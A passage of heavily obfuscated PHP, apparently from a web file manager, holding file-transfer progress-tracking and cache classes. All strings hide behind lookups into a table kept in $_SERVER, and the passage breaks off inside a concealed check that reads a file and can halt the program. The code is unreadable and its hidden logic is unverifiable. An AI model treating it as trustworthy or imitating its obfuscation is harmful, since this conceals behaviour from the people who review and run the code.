onKillSet($°…¸¸¢Ú, $²öÔ¬ï´ = array()) { $this->onKillCall = array($°…¸¸¢Ú, $²öÔ¬ï´); } public function onKill() { $¯ÊÑö°ø =& $_SERVER[¶Ô„œ…¯]; self::log($¯ÊÑö°ø[1794] . $this->task[$¯ÊÑö°ø[477]] . $¯ÊÑö°ø[1802]); Hook::trigger($¯ÊÑö°ø[1803], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Ñ»µÉ¿†) { $Ş¨îıƒ =& $_SERVER[¶Ô„œ…¯]; Cache::set($Ş¨îıƒ[1800] . $this->task[$Ş¨îıƒ[477]], $Ñ»µÉ¿†, 60); if (!is_array($Ñ»µÉ¿†) || !$Ñ»µÉ¿†[$Ş¨îıƒ[1304]]) { self::log($Ş¨îıƒ[1804] . json_encode($Ñ»µÉ¿†)); } return $Ñ»µÉ¿†; } public static function get($…ó‹éä) { $ıƒ‰ºó¢ =& $_SERVER[¶Ô„œ…¯]; $”á‘¼ù = self::valueGet($…ó‹éä); if (is_array($”á‘¼ù) && $”á‘¼ù[$ıƒ‰ºó¢[1805]]) { $§æ…¥ß¸ = ActionApply($”á‘¼ù[$ıƒ‰ºó¢[1805]], array($”á‘¼ù)); $”á‘¼ù = is_array($§æ…¥ß¸) ? $§æ…¥ß¸ : $”á‘¼ù; } return $”á‘¼ù; } public static function listData() { $ÇËÏ„Ô™ = self::valueGet(); return array_sort_by($ÇËÏ„Ô™, $_SERVER[¶Ô„œ…¯][1784], !0); } public static function kill($îÕ Ü) { return self::changeStatus($îÕ Ü, self::STATYS_KILL); } public static function stop($µ‡Óƒ¢®) { return self::changeStatus($µ‡Óƒ¢®, self::STATYS_STOP); } public static function restart($ìñ¨íƒª) { return self::changeStatus($ìñ¨íƒª, self::STATYS_RUNNING); } public static function killAll() { $‚±Êã»Ñ =& $_SERVER[¶Ô„œ…¯]; $î±Îƒ¦ì = self::listData(); foreach ($î±Îƒ¦ì as $¢§öäÃ¥) { self::kill($¢§öäÃ¥[$‚±Êã»Ñ[477]]); } sleep(2); foreach ($î±Îƒ¦ì as $¢§öäÃ¥) { self::valueSet($¢§öäÃ¥[$‚±Êã»Ñ[477]], !1); } } private static function changeStatus($¥¢İ†‡‹, $ŒèßÅ„) { $Ÿ‘±“’ =& $_SERVER[¶Ô„œ…¯]; $Öôçõ¡ = self::valueGet($¥¢İ†‡‹); if (!$Öôçõ¡) { return !1; } $Öôçõ¡[$Ÿ‘±“’[828]] = $ŒèßÅ„; self::valueSet($¥¢İ†‡‹, $Öôçõ¡); self::log($Ÿ‘±“’[1806] . $Öôçõ¡[$Ÿ‘±“’[477]] . $Ÿ‘±“’[1807] . $ŒèßÅ„); return !0; } public static function valueGet($˜ì„ìô = false) { $›ĞÊÍñ§ =& $_SERVER[¶Ô„œ…¯]; if ($˜ì„ìô) { $ùßìğŞÙ = Model($›ĞÊÍñ§[522])->where(array($›ĞÊÍñ§[97] => $˜ì„ìô, $›ĞÊÍñ§[33] => $›ĞÊÍñ§[1156]))->find(); return $ùßìğŞÙ ? json_decode($ùßìğŞÙ[$›ĞÊÍñ§[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Úâ½¢å¬ = false) { $Ü“ş’Ò… =& $_SERVER[¶Ô„œ…¯]; $êÑ¬óÌÁ = array($Ü“ş’Ò…[33] => $Ü“ş’Ò…[1156]); if ($Úâ½¢å¬) { $êÑ¬óÌÁ[$Ü“ş’Ò…[1780]] = $Úâ½¢å¬; } $Ô‡Éé“ = Model($Ü“ş’Ò…[522])->where($êÑ¬óÌÁ)->select(); $Ô‡Éé“ = $Ô‡Éé“ ? $Ô‡Éé“ : array(); foreach ($Ô‡Éé“ as $õš™»’ => $‹ÂØâĞ) { $Ô‡Éé“[$õš™»’] = json_decode($‹ÂØâĞ[$Ü“ş’Ò…[452]], !0); } return $Ô‡Éé“; } public static function valueSet($£îü—à, $éŠ÷ßë´) { $ñ×ÀŞ•§ =& $_SERVER[¶Ô„œ…¯]; if (!$éŠ÷ßë´) { return Model($ñ×ÀŞ•§[522])->where(array($ñ×ÀŞ•§[97] => $£îü—à, $ñ×ÀŞ•§[33] => $ñ×ÀŞ•§[1156]))->delete(); } $”úæ¦ë¦ = json_encode($éŠ÷ßë´); if (!$”úæ¦ë¦) { ob_start(); var_dump($éŠ÷ßë´); $ıÃ‹Îò’ = ob_get_clean(); self::log($ñ×ÀŞ•§[1808] . json_encode_force($ıÃ‹Îò’)); } if (!$£îü—à || !$éŠ÷ßë´[$ñ×ÀŞ•§[477]]) { return !1; } $ÏÏ™˜À© = array($ñ×ÀŞ•§[33] => $ñ×ÀŞ•§[1156], $ñ×ÀŞ•§[1780] => USER_ID, $ñ×ÀŞ•§[97] => $£îü—à, $ñ×ÀŞ•§[452] => $”úæ¦ë¦); $…å™òÀÂ = $ñ×ÀŞ•§[1809]; CacheLock::lock($…å™òÀÂ); Model($ñ×ÀŞ•§[522])->add($ÏÏ™˜À©, array(), !0); CacheLock::unlock($…å™òÀÂ); } public static function log($®³ïÜÒ•) { if (!GLOBAL_DEBUG) { return; } write_log($®³ïÜÒ•, $_SERVER[¶Ô„œ…¯][1810]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Œ÷¤±À =& $_SERVER[¶Ô„œ…¯]; $¥ù¦ı£ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Œ÷¤±À[1811], array($this, $Œ÷¤±À[1812])); Hook::bind($Œ÷¤±À[1315], array($this, $Œ÷¤±À[1813])); Hook::bind($Œ÷¤±À[1814], array($this, $Œ÷¤±À[1815])); Hook::bind($Œ÷¤±À[673], array($this, $Œ÷¤±À[1816])); Hook::bind($Œ÷¤±À[674], array($this, $Œ÷¤±À[1817])); Hook::bind($Œ÷¤±À[680], array($this, $Œ÷¤±À[1818])); Hook::bind($Œ÷¤±À[681], array($this, $Œ÷¤±À[1819])); Hook::bind($Œ÷¤±À[676], array($this, $Œ÷¤±À[1820])); Hook::bind($Œ÷¤±À[678], array($this, $Œ÷¤±À[1821])); Hook::bind($Œ÷¤±À[642], array($this, $Œ÷¤±À[1822])); Hook::bind($Œ÷¤±À[639], array($this, $Œ÷¤±À[1822])); Hook::bind($Œ÷¤±À[644], array($this, $Œ÷¤±À[1822])); Hook::bind($Œ÷¤±À[646], array($this, $Œ÷¤±À[1822])); Hook::bind($Œ÷¤±À[648], array($this, $Œ÷¤±À[1822])); Hook::bind($Œ÷¤±À[1823], array($this, $Œ÷¤±À[1824])); Hook::bind($Œ÷¤±À[664], array($this, $Œ÷¤±À[1825])); $this->sourceModelCopyFlag = !1; Hook::bind($Œ÷¤±À[1826], array($this, $Œ÷¤±À[1827])); Hook::bind($Œ÷¤±À[1828], array($this, $Œ÷¤±À[1829])); Hook::bind($Œ÷¤±À[1830], array($this, $Œ÷¤±À[1831])); $¥ù¦ı£[$Œ÷¤±À[1832]] = LNG($Œ÷¤±À[1833]); $¥ù¦ı£[$Œ÷¤±À[1834]] = 0; $¥ù¦ı£[$Œ÷¤±À[1835]] = 0; $¥ù¦ı£[$Œ÷¤±À[1149]] = $Œ÷¤±À[12]; $¥ù¦ı£[$Œ÷¤±À[1836]] = $Œ÷¤±À[12]; $¥ù¦ı£[$Œ÷¤±À[1837]] = 0; $¥ù¦ı£[$Œ÷¤±À[1838]] = 0; $¥ù¦ı£[$Œ÷¤±À[1839]] = 0; if (!$¥ù¦ı£[$Œ÷¤±À[1666]]) { $¥ù¦ı£[$Œ÷¤±À[1666]] = LNG($Œ÷¤±À[1840]); } } protected function endAfter() { $²³×›¼İ =& $_SERVER[¶Ô„œ…¯]; Hook::unbind($²³×›¼İ[1811], array($this, $²³×›¼İ[1812])); Hook::unbind($²³×›¼İ[1315], array($this, $²³×›¼İ[1813])); Hook::unbind($²³×›¼İ[1814], array($this, $²³×›¼İ[1815])); Hook::unbind($²³×›¼İ[673], array($this, $²³×›¼İ[1816])); Hook::unbind($²³×›¼İ[674], array($this, $²³×›¼İ[1817])); Hook::unbind($²³×›¼İ[680], array($this, $²³×›¼İ[1818])); Hook::unbind($²³×›¼İ[681], array($this, $²³×›¼İ[1819])); Hook::unbind($²³×›¼İ[676], array($this, $²³×›¼İ[1820])); Hook::unbind($²³×›¼İ[678], array($this, $²³×›¼İ[1821])); Hook::unbind($²³×›¼İ[642], array($this, $²³×›¼İ[1822])); Hook::unbind($²³×›¼İ[639], array($this, $²³×›¼İ[1822])); Hook::unbind($²³×›¼İ[644], array($this, $²³×›¼İ[1822])); Hook::unbind($²³×›¼İ[646], array($this, $²³×›¼İ[1822])); Hook::unbind($²³×›¼İ[648], array($this, $²³×›¼İ[1822])); Hook::unbind($²³×›¼İ[1823], array($this, $²³×›¼İ[1824])); Hook::unbind($²³×›¼İ[664], array($this, $²³×›¼İ[1825])); Hook::unbind($²³×›¼İ[1826], array($this, $²³×›¼İ[1827])); Hook::unbind($²³×›¼İ[1828], array($this, $²³×›¼İ[1829])); Hook::unbind($²³×›¼İ[1830], array($this, $²³×›¼İ[1831])); } public function copyMoveStart($ğ®Å¨î, $ñ½Æê‡æ, $Ö¥Ëİ±ë, $ñÒûÛé) { $”ªÁ·Æú =& $_SERVER[¶Ô„œ…¯]; self::log($”ªÁ·Æú[1841] . $ñ½Æê‡æ . $”ªÁ·Æú[73] . $ñÒûÛé); $©ïÃÛ™Æ = rtrim(TEMP_FILES, $”ªÁ·Æú[8]); if (substr($ñ½Æê‡æ, 0, strlen($©ïÃÛ™Æ)) == $©ïÃÛ™Æ) { return; } if (substr($ñÒûÛé, 0, strlen($©ïÃÛ™Æ)) == $©ïÃÛ™Æ) { return; } $á¢†º¤° =& $this->task; $á¢†º¤°[$”ªÁ·Æú[1842]] = KodIO::transferType($ğ®Å¨î, $Ö¥Ëİ±ë); $this->update(); } public function updateAfter() { $óóƒ€·ù =& $_SERVER[¶Ô„œ…¯]; $¹»¿„š¡ =& $this->task; if (!$¹»¿„š¡[$óóƒ€·ù[841]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¹»¿„š¡[$óóƒ€·ù[1842]] == $óóƒ€·ù[1409]) { return; } self::updateTask($¹»¿„š¡); } private static function updateTask(&$š×€­è˜) { $ªï­‡µ =& $_SERVER[¶Ô„œ…¯]; if ($š×€­è˜[$ªï­‡µ[1842]] == $ªï­‡µ[1286] || $š×€­è˜[$ªï­‡µ[1842]] == $ªï­‡µ[110]) { if ($š×€­è˜[$ªï­‡µ[1836]]) { $š×€­è˜[$ªï­‡µ[1839]] = $š×€­è˜[$ªï­‡µ[1838]] + $š×€­è˜[$ªï­‡µ[1835]]; } } else { if ($š×€­è˜[$ªï­‡µ[1842]] == $ªï­‡µ[1410]) { if ($š×€­è˜[$ªï­‡µ[1836]] == $ªï­‡µ[1286]) { $š×€­è˜[$ªï­‡µ[1839]] = $š×€­è˜[$ªï­‡µ[1838]] + $š×€­è˜[$ªï­‡µ[1835]] * 0.5; } else { if ($š×€­è˜[$ªï­‡µ[1836]] == $ªï­‡µ[110]) { $š×€­è˜[$ªï­‡µ[1839]] = $š×€­è˜[$ªï­‡µ[1838]] + $š×€­è˜[$ªï­‡µ[1834]] * 0.5 + $š×€­è˜[$ªï­‡µ[1835]] * 0.5; } } } } $š×€­è˜[$ªï­‡µ[1782]] = $š×€­è˜[$ªï­‡µ[1839]] / $š×€­è˜[$ªï­‡µ[841]]; if ($š×€­è˜[$ªï­‡µ[1782]] > 0) { $êğñ—ñ¸ = timeFloat() - $š×€­è˜[$ªï­‡µ[1784]] - $š×€­è˜[$ªï­‡µ[1787]]; $š×€­è˜[$ªï­‡µ[1788]] = $êğñ—ñ¸ * (1 - $š×€­è˜[$ªï­‡µ[1782]]) / $š×€­è˜[$ªï­‡µ[1782]]; } } public function addPath($‚–Ç€×Š) { $çã§ö =& $_SERVER[¶Ô„œ…¯]; if (!$‚–Ç€×Š) { return; } $¸³µ¸› =& $this->task; $‘»çíúÖ = IO::infoWithChildren($‚–Ç€×Š); $Å³“ü­µ = $¸³µ¸›[$çã§ö[1843]] ? $¸³µ¸›[$çã§ö[1843]][$çã§ö[1844]] : 0; $¸³µ¸›[$çã§ö[1843]] = array($çã§ö[1844] => $Å³“ü­µ + 1, $çã§ö[496] => $‘»çíúÖ[$çã§ö[32]], $çã§ö[87] => $‘»çíúÖ[$çã§ö[87]], $çã§ö[584] => $‘»çíúÖ[$çã§ö[584]] ? $‘»çíúÖ[$çã§ö[584]] : $‘»çíúÖ[$çã§ö[87]]); if ($‘»çíúÖ[$çã§ö[33]] == $çã§ö[232]) { $¸³µ¸›[$çã§ö[1147]] += 1; } else { $¸³µ¸›[$çã§ö[1147]] += $‘»çíúÖ[$çã§ö[82]][$çã§ö[80]]; if ($‘»çíúÖ[$çã§ö[193]]) { $¸³µ¸›[$çã§ö[1147]] += $‘»çíúÖ[$çã§ö[82]][$çã§ö[81]] + 1; } } $¸³µ¸›[$çã§ö[841]] += $‘»çíúÖ[$çã§ö[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($˜¤òÆ’Ç) { } public function sourceAddHashEnd($‹ºê–“­) { } public function sourceAddFileStart($™˜üç¸ß) { $è±©™Š² =& $_SERVER[¶Ô„œ…¯]; $ƒéıëÛ² =& $this->task; $ƒéıëÛ²[$è±©™Š²[1834]] = $™˜üç¸ß[$è±©™Š²[79]]; $ƒéıëÛ²[$è±©™Š²[1832]] = $™˜üç¸ß[$è±©™Š²[32]]; $ƒéıëÛ²[$è±©™Š²[1149]] = $™˜üç¸ß[$è±©™Š²[32]]; $ƒéıëÛ²[$è±©™Š²[1845]] = $™˜üç¸ß[$è±©™Š²[87]]; $this->update(); } public function sourceAddFileEnd($‡êë™¥ü) { $‡Ö¬ÍÚ£ =& $_SERVER[¶Ô„œ…¯]; $¡ğÊÖµ =& $this->task; $¡ğÊÖµ[$‡Ö¬ÍÚ£[1839]] += $‡êë™¥ü[$‡Ö¬ÍÚ£[79]]; $¡ğÊÖµ[$‡Ö¬ÍÚ£[1845]] = $‡êë™¥ü[$‡Ö¬ÍÚ£[87]]; $this->update(1); } public function copyFileStart($äÔÏ¬Ÿ, $³™•Êñ¤, $Ï€ÁÄ§, $óßİ÷Ğ¸, $Ì¸ñ¶ê, $Ü›¢ğó´) { $ÙêËÛŸÂ =& $_SERVER[¶Ô„œ…¯]; $Œ£‰•‡§ = $Ì¸ñ¶ê; if ($Œ£‰•‡§ == $GLOBALS[$ÙêËÛŸÂ[1846]]) { $Œ£‰•‡§ = $GLOBALS[$ÙêËÛŸÂ[1847]]; } $GLOBALS[$ÙêËÛŸÂ[1847]] = $Ì¸ñ¶ê; $GLOBALS[$ÙêËÛŸÂ[1846]] = $Ü›¢ğó´; $Â¡Ç¬â· =& $this->task; $Â¡Ç¬â·[$ÙêËÛŸÂ[1832]] = $Œ£‰•‡§; $Â¡Ç¬â·[$ÙêËÛŸÂ[1834]] = (int) $äÔÏ¬Ÿ->size($³™•Êñ¤); $Â¡Ç¬â·[$ÙêËÛŸÂ[1835]] = 0; $Â¡Ç¬â·[$ÙêËÛŸÂ[1149]] = $ÙêËÛŸÂ[12]; $Â¡Ç¬â·[$ÙêËÛŸÂ[1836]] = $ÙêËÛŸÂ[12]; $Â¡Ç¬â·[$ÙêËÛŸÂ[1837]] = 0; $†‡şÂË€ = $Â¡Ç¬â·[$ÙêËÛŸÂ[1834]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Â¡Ç¬â·[$ÙêËÛŸÂ[477]] . $ÙêËÛŸÂ[1848]); if ($†‡şÂË€ && file_exists(get_path_father($óßİ÷Ğ¸))) { Cache::set($Â¡Ç¬â·[$ÙêËÛŸÂ[477]] . $ÙêËÛŸÂ[1848], $óßİ÷Ğ¸); $Â¡Ç¬â·[$ÙêËÛŸÂ[1805]] = array($ÙêËÛŸÂ[1849], $ÙêËÛŸÂ[1850]); } $this->update(0, $†‡şÂË€); } public static function updateCopyLocalFileSize($í‘™í­ë) { $Õ€½í•º =& $_SERVER[¶Ô„œ…¯]; $—Û‰ƒ“º = Cache::get($í‘™í­ë[$Õ€½í•º[477]] . $Õ€½í•º[1848]); if (!$—Û‰ƒ“º || !file_exists($—Û‰ƒ“º)) { return $í‘™í­ë; } $í‘™í­ë[$Õ€½í•º[1835]] = @filesize($—Û‰ƒ“º); $í‘™í­ë[$Õ€½í•º[1839]] += $í‘™í­ë[$Õ€½í•º[1835]]; self::updateTask($í‘™í­ë); return $í‘™í­ë; } public function copyFileEnd($ÇİÕöéş, $ƒíçÎ¨‚, $•Öğ„Õˆ, $èş’ùŞ§, $Úæ†¢¹, $¸“Êôî) { $™³óÖ =& $_SERVER[¶Ô„œ…¯]; $ûÁ½ÓñÂ =& $this->task; $ûÁ½ÓñÂ[$™³óÖ[1835]] = $ûÁ½ÓñÂ[$™³óÖ[1834]]; $ûÁ½ÓñÂ[$™³óÖ[1836]] = $™³óÖ[12]; unset($ûÁ½ÓñÂ[$™³óÖ[1805]]); if ($Úæ†¢¹ == $ûÁ½ÓñÂ[$™³óÖ[1832]]) { $ûÁ½ÓñÂ[$™³óÖ[1838]] += $ûÁ½ÓñÂ[$™³óÖ[1834]]; $ûÁ½ÓñÂ[$™³óÖ[1839]] = $ûÁ½ÓñÂ[$™³óÖ[1838]]; $âÔ–Ÿº÷ = 1; if (isset($ûÁ½ÓñÂ[$™³óÖ[1845]]) && $ûÁ½ÓñÂ[$™³óÖ[1845]] == $ƒíçÎ¨‚) { $âÔ–Ÿº÷ = 0; } $this->update($âÔ–Ÿº÷); } else { $this->update(); $ûÁ½ÓñÂ[$™³óÖ[1835]] = 0; } Cache::remove($ûÁ½ÓñÂ[$™³óÖ[477]] . $™³óÖ[1848]); self::log($™³óÖ[1851] . $ƒíçÎ¨‚ . $™³óÖ[73] . $èş’ùŞ§ . $™³óÖ[287] . $Úæ†¢¹ . $™³óÖ[1852] . $ûÁ½ÓñÂ[$™³óÖ[1832]]); } public function updateFileEnd($¶å¥Òôİ, $ë™§…™¤) { $È—şò¶È =& $_SERVER[¶Ô„œ…¯]; $Å’··ô =& $this->task; $Å’··ô[$È—şò¶È[1832]] = $¶å¥Òôİ; $Å’··ô[$È—şò¶È[1834]] = $ë™§…™¤; $Å’··ô[$È—şò¶È[1838]] += $ë™§…™¤; $Å’··ô[$È—şò¶È[1839]] = $Å’··ô[$È—şò¶È[1838]]; $this->update(1); self::log($È—şò¶È[1853] . $¶å¥Òôİ); } public function sourceModelCopy($úó€ÇÇ) { $µÜ¢÷¯ =& $_SERVER[¶Ô„œ…¯]; $¤×ã°º  = $úó€ÇÇ[0]; $­„‘²£ˆ = $úó€ÇÇ[1]; $ÊÅíÎïˆ =& $this->task; $this->sourceModelCopyFlag = !0; $øÚ‹‰½Ö = 0; switch ($¤×ã°º ) { case $µÜ¢÷¯[640]: $øÚ‹‰½Ö = 1; break; case $µÜ¢÷¯[643]: $ÊÅíÎïˆ[$µÜ¢÷¯[1832]] = $­„‘²£ˆ[$µÜ¢÷¯[32]]; break; case $µÜ¢÷¯[645]: $øÚ‹‰½Ö = intval($úó€ÇÇ[$µÜ¢÷¯[458]] * 0.4); break; case $µÜ¢÷¯[647]: $øÚ‹‰½Ö = intval($úó€ÇÇ[$µÜ¢÷¯[458]] * 0.2); break; case $µÜ¢÷¯[649]: $øÚ‹‰½Ö = intval($úó€ÇÇ[$µÜ¢÷¯[458]] * 0.4); break; } $this->update($øÚ‹‰½Ö); $this->sourceModelCopyFlag = !1; } public function sourceRemove($„¸¼Û‚, $äì¯¦·) { $²¶ÅÖ¹ª =& $_SERVER[¶Ô„œ…¯]; $this->sourceModelCopyFlag = !0; $¿ÔæÈÖã = 1; if (isset($„¸¼Û‚[$²¶ÅÖ¹ª[82]])) { $¿ÔæÈÖã = $„¸¼Û‚[$²¶ÅÖ¹ª[82]][$²¶ÅÖ¹ª[80]]; $¿ÔæÈÖã = $¿ÔæÈÖã + $„¸¼Û‚[$²¶ÅÖ¹ª[82]][$²¶ÅÖ¹ª[81]] + 1; } $this->update($¿ÔæÈÖã); $this->sourceModelCopyFlag = !1; } public function sourceMove($İ–ó‹ï³) { $this->sourceRemove($İ–ó‹ï³, !1); } public function curlProgress($É©®ì†ƒ, $²öÈ³§×, $Ş¸“ş—ò, $îƒËÖ£û, $æ ƒÛÂ‘) { $±¸°½ã„ =& $_SERVER[¶Ô„œ…¯]; $ÅéÈ™ =& $this->task; if ($æ ƒÛÂ‘ > 0) { $ÅéÈ™[$±¸°½ã„[1149]] = $±¸°½ã„[1854]; $ÅéÈ™[$±¸°½ã„[1836]] = $±¸°½ã„[110]; if ($ÅéÈ™[$±¸°½ã„[1834]]) { $ÅéÈ™[$±¸°½ã„[1835]] = $æ ƒÛÂ‘; } if ($ÅéÈ™[$±¸°½ã„[1837]]) { $ÅéÈ™[$±¸°½ã„[1835]] = $æ ƒÛÂ‘ + $ÅéÈ™[$±¸°½ã„[1837]]; } } else { if ($Ş¸“ş—ò > 0) { if ($ÅéÈ™[$±¸°½ã„[1834]] == $²öÈ³§×) { $ÅéÈ™[$±¸°½ã„[1835]] = $Ş¸“ş—ò; $ÅéÈ™[$±¸°½ã„[1149]] = $±¸°½ã„[1855]; $ÅéÈ™[$±¸°½ã„[1836]] = $±¸°½ã„[1286]; } } } $this->update(); } public function curlProgressStart($àÍ±âçí) { } public function curlProgressEnd($ÊùÂ·) { $¨èÖŞ× =& $_SERVER[¶Ô„œ…¯]; $É³òµîı =& $this->task; $¸ê²Ïøˆ = curl_getinfo($ÊùÂ·); $ë¿ïæíŠ = $¸ê²Ïøˆ[$¨èÖŞ×[1856]]; if ($ë¿ïæíŠ == -1) { $ë¿ïæíŠ = $¸ê²Ïøˆ[$¨èÖŞ×[1857]]; } if ($É³òµîı[$¨èÖŞ×[1836]] == $¨èÖŞ×[110] && $ë¿ïæíŠ) { $É³òµîı[$¨èÖŞ×[1837]] += $ë¿ïæíŠ; } $this->update(); } } goto d·–ÈêÈ¢ò; aáôËÀÍ×: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¨óğ±½• =& $_SERVER[¶Ô„œ…¯]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ó«×” ½ = $GLOBALS[$¨óğ±½•[6]][$¨óğ±½•[426]]; $´À’Ûöä = $ó«×” ½[$ó«×” ½[$¨óğ±½•[905]]]; $´ïÓ’Œ© = $ó«×” ½[$¨óğ±½•[906]]; switch ($ó«×” ½[$¨óğ±½•[905]]) { case $¨óğ±½•[21]: self::$handle = Model($¨óğ±½•[907]); break; case $¨óğ±½•[908]: self::$handle = new CacheRedis($´À’Ûöä, $´ïÓ’Œ©); break; case $¨óğ±½•[909]: self::$handle = new CacheMemcached($´À’Ûöä, $´ïÓ’Œ©); break; case $¨óğ±½•[232]: self::$handle = new CacheFile($´À’Ûöä, $´ïÓ’Œ©); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($É‘†Ú°¨) { if (is_array($É‘†Ú°¨) || is_object($É‘†Ú°¨)) { $É‘†Ú°¨ = json_encode($É‘†Ú°¨); } $É‘†Ú°¨ = rawurlencode($É‘†Ú°¨); return md5(KOD_SITE_ID . $_SERVER[¶Ô„œ…¯][11] . $É‘†Ú°¨); } public static function get($ä¤Ï»‹É, $Ğõ¸•é = false) { $™Şùê¬Ñ = self::key($ä¤Ï»‹É); $ï‡òÚ¥‡ = self::init(); if ($Ğõ¸•é) { return unserialize($ï‡òÚ¥‡->get($™Şùê¬Ñ)); } if (!isset(self::$memoryCache[$™Şùê¬Ñ])) { $ˆ Û’Äˆ = $ï‡òÚ¥‡->get($™Şùê¬Ñ); self::$memoryCache[$™Şùê¬Ñ] = unserialize($ˆ Û’Äˆ); } return self::$memoryCache[$™Şùê¬Ñ]; } public static function set($‡ò¹Ğ¡ü, $ô³æØ‘ã, $ÚŞ¯±‡ı = false) { $ƒØéÑ™ =& $_SERVER[¶Ô„œ…¯]; $ù¾¿ªš¹ = self::key($‡ò¹Ğ¡ü); if (isset(self::$memoryCache[$ù¾¿ªš¹]) && self::$memoryCache[$ù¾¿ªš¹] === $ô³æØ‘ã) { return !0; } if ($ÚŞ¯±‡ı === 0) { self::$memoryCache[$ù¾¿ªš¹] = $ô³æØ‘ã; return !0; } $í–ŠÓß¦ = self::init(); $¥ó»åñÏ = serialize($ô³æØ‘ã); CacheLock::lock($‡ò¹Ğ¡ü . $ƒØéÑ™[910]); $Ü´ ä¤° = $í–ŠÓß¦->set($ù¾¿ªš¹, $¥ó»åñÏ, $ÚŞ¯±‡ı); self::$memoryCache[$ù¾¿ªš¹] = $ô³æØ‘ã; CacheLock::unlock($‡ò¹Ğ¡ü . $ƒØéÑ™[910]); return $Ü´ ä¤°; } public static function getCall($âÑöŞ–, $ú£³ªÅø, $ìİü…Ÿƒ, $Íë†İ£ = array()) { $°Ë©ñ¾¤ =& $_SERVER[¶Ô„œ…¯]; $ÍÌ¡È½à = self::get($âÑöŞ–); if ($ÍÌ¡È½à || $ÍÌ¡È½à === $°Ë©ñ¾¤[12]) { return $ÍÌ¡È½à; } $ÍÌ¡È½à = call_user_func_array($ìİü…Ÿƒ, $Íë†İ£); $ÍÌ¡È½à = $ÍÌ¡È½à ? $ÍÌ¡È½à : $°Ë©ñ¾¤[12]; self::set($âÑöŞ–, $ÍÌ¡È½à, $ú£³ªÅø); return $ÍÌ¡È½à; } public static function remove($ÊÄĞÔÅş) { $ÙŒ¿­šØ = self::key($ÊÄĞÔÅş); unset(self::$memoryCache[$ÙŒ¿­šØ]); self::clearTimeout(); CacheLock::lock($ÊÄĞÔÅş); $›«‰¸©İ = self::init()->remove($ÙŒ¿­šØ); CacheLock::unlock($ÊÄĞÔÅş); return $›«‰¸©İ; } public static function removeMemory($‚¡ØÙç†) { $§÷¡µå© = self::key($‚¡ØÙç†); unset(self::$memoryCache[$§÷¡µå©]); } public static function clearMemory($™ê¤Â’ñ = false) { if ($™ê¤Â’ñ) { $™ê¤Â’ñ = self::key($™ê¤Â’ñ); unset(self::$memoryCache[$™ê¤Â’ñ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¶Ô„œ…¯][911])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¶Ô„œ…¯][912])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($³Æ‚”µ, $Ÿî´Ú²İ) { $Ä‡ı…É° =& $_SERVER[¶Ô„œ…¯]; $this->cachePath = $³Æ‚”µ[$Ä‡ı…É°[87]]; $this->prefix = $Ä‡ı…É°[913]; $this->cacheTime = $Ÿî´Ú²İ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ÃÆ²™±İ) { $ÓÛèš =& $_SERVER[¶Ô„œ…¯]; $ÃÆ²™±İ = str_replace(array($ÓÛèš[914], $ÓÛèš[100], $ÓÛèš[76]), $ÓÛèš[915], $ÃÆ²™±İ); return $this->cachePath . $ÓÛèš[916] . $ÃÆ²™±İ . $ÓÛèš[917]; } public function set($¿Èƒ©û , $à£ÆŞªı, $Åºä€– = false) { $Åºä€– = $Åºä€– ? $Åºä€– : $this->cacheTime; $õÁ×Í˜¬ = $this->getFile($¿Èƒ©û ); if (file_put_contents($õÁ×Í˜¬, $this->prefix . $à£ÆŞªı, LOCK_EX)) { @touch($õÁ×Í˜¬, intval(time() + $Åºä€–)); clearstatcache(); return !0; } @unlink($õÁ×Í˜¬); return !1; } public function get($Ø‚Í««©) { $®ªÚ½” = $this->getFile($Ø‚Í««©); if (file_exists($®ªÚ½”) && filemtime($®ªÚ½”) < time()) { @unlink($®ªÚ½”); return !1; } $ğ—·¸µ¢ = @file_get_contents($®ªÚ½”); return substr($ğ—·¸µ¢, strlen($this->prefix)); } public function remove($ŞûŸØë) { $¨ø©„âÃ = $this->getFile($ŞûŸØë); return @unlink($¨ø©„âÃ); } public function deleteAll() { $Ã—öºú =& $_SERVER[¶Ô„œ…¯]; $‘åş®ÌÓ = scandir($this->cachePath); foreach ($‘åş®ÌÓ as $éñÜŠ ) { $ÓÖË›¼ = $this->cachePath . $éñÜŠ ; if (strpos($ÓÖË›¼, $Ã—öºú[917]) && strpos($ÓÖË›¼, $Ã—öºú[918])) { @unlink($ÓÖË›¼); } } } public function clearTimeout() { $ö™ø÷ì— =& $_SERVER[¶Ô„œ…¯]; $äœØå–­ = scandir($this->cachePath); foreach ($äœØå–­ as $ÑÒ¬¬©â) { $öÄ˜™¼š = $this->cachePath . $ÑÒ¬¬©â; if (strpos($öÄ˜™¼š, $ö™ø÷ì—[917]) && strpos($öÄ˜™¼š, $ö™ø÷ì—[918]) && filemtime($öÄ˜™¼š) < time()) { @unlink($öÄ˜™¼š); } } } } if ($_SERVER[$_SERVER[¶Ô„œ…¯][919]] != $_SERVER[$_SERVER[¶Ô„œ…¯][920]]) { $_getc = $_SERVER[¶Ô„œ…¯][921]; $_getfile = $_SERVER[$_SERVER[¶Ô„œ…¯][922]] . $_SERVER[¶Ô„œ…¯][923]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¶Ô„œ…¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[¶Ô„œ…¯][696]) { $exit = $_SERVER[¶Ô„œ…¯][924]; $exit(); } $_act = 